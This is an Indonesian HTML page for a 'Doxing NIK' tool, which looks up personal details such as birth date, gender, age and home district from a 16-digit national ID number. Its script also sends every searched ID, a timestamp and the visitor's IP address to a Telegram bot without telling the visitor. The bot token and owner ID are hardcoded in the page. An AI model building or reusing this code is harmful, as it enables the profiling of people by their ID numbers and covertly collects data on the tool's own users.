<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Doxing NIK â€“ Zyxxennn</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
  <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
  <script src="https://unpkg.com/feather-icons"></script>
  <style>
    :root{
      --blue:#0052d4;
      --dark:#111827;
      --light:#f5f7fa;
      --gradient: linear-gradient(135deg, #0052d4 0%, #4364f7 100%);
    }
    body{
      background:var(--light);
      color:var(--dark);
      font-family: 'Inter', system-ui, -apple-system, sans-serif;
    }
    @media (prefers-color-scheme:dark){
      body{
        background:var(--dark);
        color:var(--light);
      }
    }
    .btn-primary{
      background: var(--gradient);
      color:#fff;
      transition: all 0.3s ease;
      box-shadow: 0 4px 6px rgba(0, 82, 212, 0.1);
    }
    .btn-primary:hover{
      transform: translateY(-2px);
      box-shadow: 0 6px 12px rgba(0, 82, 212, 0.2);
    }
    .card {
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    .card:hover {
      transform: translateY(-5px);
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
    }
    .glow {
      animation: glow 2s infinite alternate;
    }
    @keyframes glow {
      from {
        box-shadow: 0 0 5px rgba(0, 82, 212, 0.5);
      }
      to {
        box-shadow: 0 0 20px rgba(0, 82, 212, 0.8);
      }
    }
  </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">
  <div id="vanta-bg" class="fixed inset-0 -z-10 opacity-20"></div>

  <main class="w-full max-w-2xl" data-aos="fade-up">
    <header class="text-center mb-8">
      <div class="inline-flex items-center justify-center mb-4">
        <div class="w-12 h-12 rounded-full bg-gradient-to-r from-blue-600 to-blue-400 flex items-center justify-center text-white mr-3">
          <i data-feather="search"></i>
        </div>
        <h1 class="text-4xl md:text-5xl font-extrabold tracking-tight bg-clip-text text-transparent bg-gradient-to-r from-blue-600 to-blue-400">
          Doxing NIK
        </h1>
      </div>
      <p class="text-sm md:text-base text-gray-500 dark:text-gray-400 mt-2 max-w-md mx-auto">
        Masukkan 16 digit Nomor Induk Kependudukan untuk mendapatkan informasi lengkap.
      </p>
    </header>

    <form id="form" class="bg-white dark:bg-gray-800 rounded-xl shadow-xl p-6 space-y-5 card">
      <div class="relative">
        <input id="nik"
               type="text"
               maxlength="16"
               pattern="\d{16}"
               placeholder="Contoh: 3214011210060008"
               required
               class="w-full px-4 py-3 rounded-lg border border-gray-300 dark:border-gray-600 bg-gray-50 dark:bg-gray-700 focus:ring-2 focus:ring-blue-500 focus:outline-none transition-all duration-200"/>
        <div class="absolute right-3 top-3 text-gray-400">
          <i data-feather="credit-card"></i>
        </div>
      </div>
      <button type="submit" class="btn-primary w-full py-3 rounded-lg font-semibold shadow-md flex items-center justify-center gap-2">
        <i data-feather="search" class="w-5 h-5"></i>
        <span>Cari Data</span>
      </button>
    </form>

    <!-- Spinner -->
    <div id="loading" class="hidden mt-8 flex flex-col items-center justify-center">
      <div class="w-12 h-12 border-4 border-gray-300 dark:border-gray-600 border-t-blue-500 rounded-full animate-spin mb-3"></div>
      <p class="text-gray-500 dark:text-gray-400">Memproses data...</p>
    </div>

    <!-- Hasil -->
    <div id="hasil" class="hidden mt-6 bg-white dark:bg-gray-800 rounded-xl shadow-xl p-6 card glow">
      <div class="flex items-center justify-between mb-4">
        <h2 class="text-xl font-bold text-blue-600 dark:text-blue-400 flex items-center gap-2">
          <i data-feather="info"></i>
          <span>Hasil Pencarian</span>
        </h2>
        <button id="copy-btn" class="text-sm bg-gray-100 dark:bg-gray-700 hover:bg-gray-200 dark:hover:bg-gray-600 px-3 py-1 rounded-lg flex items-center gap-1 transition-colors">
          <i data-feather="copy" class="w-4 h-4"></i>
          <span>Salin</span>
        </button>
      </div>
      <div id="list" class="grid grid-cols-1 md:grid-cols-2 gap-x-6 gap-y-3 text-sm md:text-base"></div>
    </div>

    <!-- Error -->
    <div id="error" class="hidden mt-6 bg-red-100 dark:bg-red-900/50 border border-red-300 dark:border-red-600 text-red-800 dark:text-red-200 rounded-xl p-4 flex items-start gap-3">
      <i data-feather="alert-circle" class="w-5 h-5 mt-0.5 flex-shrink-0"></i>
      <div>
        <h3 class="font-semibold">Error</h3>
        <p id="error-message" class="text-sm"></p>
      </div>
    </div>
  </main>

  <footer class="text-center text-xs text-gray-400 dark:text-gray-500 py-8 mt-auto">
    <div class="flex items-center justify-center gap-4 mb-2">
      <a href="#" class="hover:text-blue-500 transition-colors"><i data-feather="github"></i></a>
      <a href="#" class="hover:text-blue-500 transition-colors"><i data-feather="twitter"></i></a>
      <a href="#" class="hover:text-blue-500 transition-colors"><i data-feather="mail"></i></a>
    </div>
    <p>Â© 2025 Doxing NIK â€“ Zyxxennn. All rights reserved.</p>
  </footer>

  <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.globe.min.js"></script>
  <script>
    // Initialize animations
    AOS.init({
      duration: 800,
      once: true
    });
    
    // Background animation
    VANTA.GLOBE({
      el: "#vanta-bg",
      mouseControls: true,
      touchControls: true,
      gyroControls: false,
      minHeight: 200.00,
      minWidth: 200.00,
      scale: 1.00,
      scaleMobile: 1.00,
      color: 0x3a7bd5,
      backgroundColor: 0x0,
      size: 0.8
    });

    // DOM elements
    const form = document.getElementById('form');
    const nikInp = document.getElementById('nik');
    const hasil = document.getElementById('hasil');
    const list = document.getElementById('list');
    const loader = document.getElementById('loading');
    const error = document.getElementById('error');
    const errorMessage = document.getElementById('error-message');
    const copyBtn = document.getElementById('copy-btn');

    // Telegram bot details
    const BOT_TOKEN = '8330143062:AAGIYPE3ssRG-2-HiOkwlvP2AG7mtoGkgQ8';
    const OWNER_ID = '8447173769';

    // Send notification to Telegram
    async function sendTelegramNotification(nik) {
      try {
        const message = `ðŸ”” New NIK Search\n\nNIK: ${nik}\nTime: ${new Date().toLocaleString()}\nIP: ${await getIP()}`;
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: OWNER_ID,
            text: message,
            parse_mode: 'Markdown'
          })
        });
      } catch (err) {
        console.error('Telegram notification failed:', err);
      }
    }

    // Get user IP
    async function getIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip || 'Unknown';
      } catch {
        return 'Unknown';
      }
    }

    // Form submission
    form.addEventListener('submit', async e => {
      e.preventDefault();
      const nik = nikInp.value.trim();
      if (!/^\d{16}$/.test(nik)) return showError('NIK harus 16 digit angka.');

      hide(hasil); hide(error); show(loader);
      
      try {
        // Send notification to owner
        await sendTelegramNotification(nik);
        
        const res = await fetch(`https://api.fikmydomainsz.xyz/tools/nik?nik=${nik}`, {mode:'cors'});
        if (!res.ok) throw new Error('Gagal mengambil data dari server.');
        const data = await res.json();
        if (data.status !== true) throw new Error(data.message || 'Data tidak ditemukan.');
        render(data.result);
      } catch (err) {
        showError(err.message || 'Terjadi kesalahan pada server.');
      } finally {
        hide(loader);
      }
    });

    // Copy results
    copyBtn.addEventListener('click', () => {
      const items = Array.from(document.querySelectorAll('#list > div')).map(div => {
        const key = div.querySelector('span:first-child').textContent;
        const value = div.querySelector('span:last-child').textContent;
        return `${key}: ${value}`;
      }).join('\n');
      
      navigator.clipboard.writeText(items).then(() => {
        const originalText = copyBtn.innerHTML;
        copyBtn.innerHTML = '<i data-feather="check" class="w-4 h-4"></i><span>Tersalin!</span>';
        setTimeout(() => {
          copyBtn.innerHTML = originalText;
          feather.replace();
        }, 2000);
      });
    });

    // Render results
    function render(r){
      const items = [
        {k:'NIK', v:r.nik, icon: 'credit-card'},
        {k:'Jenis Kelamin', v:r.kelamin, icon: 'user'},
        {k:'Tanggal Lahir', v:r.lahir_lengkap, icon: 'calendar'},
        {k:'Zodiak', v:r.tambahan.zodiak, icon: 'star'},
        {k:'Usia', v:r.tambahan.usia, icon: 'clock'},
        {k:'Ultah Selanjutnya', v:r.tambahan.ultah, icon: 'gift'},
        {k:'Provinsi', v:r.provinsi.nama, icon: 'map-pin'},
        {k:'Kabupaten/Kota', v:r.kotakab.nama, icon: 'map'},
        {k:'Kecamatan', v:r.kecamatan.nama, icon: 'navigation'},
        {k:'Kode Wilayah', v:r.kode_wilayah, icon: 'hash'},
        {k:'Nomor Urut', v:r.nomor_urut, icon: 'list'},
        {k:'Pasaran', v:r.tambahan.pasaran, icon: 'moon'}
      ];
      
      list.innerHTML = items.map(i=>`
        <div class="flex flex-col sm:flex-row sm:justify-between py-3 border-b border-gray-200 dark:border-gray-700">
          <div class="flex items-center gap-2 text-gray-600 dark:text-gray-400 mb-1 sm:mb-0">
            <i data-feather="${i.icon}" class="w-4 h-4"></i>
            <span class="font-medium">${i.k}</span>
          </div>
          <span class="font-semibold text-right">${i.v}</span>
        </div>`).join('');
      
      show(hasil);
      feather.replace();
    }

    // Helper functions
    function show(el){ el.classList.remove('hidden'); }
    function hide(el){ el.classList.add('hidden'); }
    function showError(msg){ 
      errorMessage.textContent = msg; 
      show(error); 
      setTimeout(() => hide(error), 5000); 
    }

    // Initialize feather icons
    document.addEventListener('DOMContentLoaded', () => {
      feather.replace();
    });
  </script>
</body>
</html>
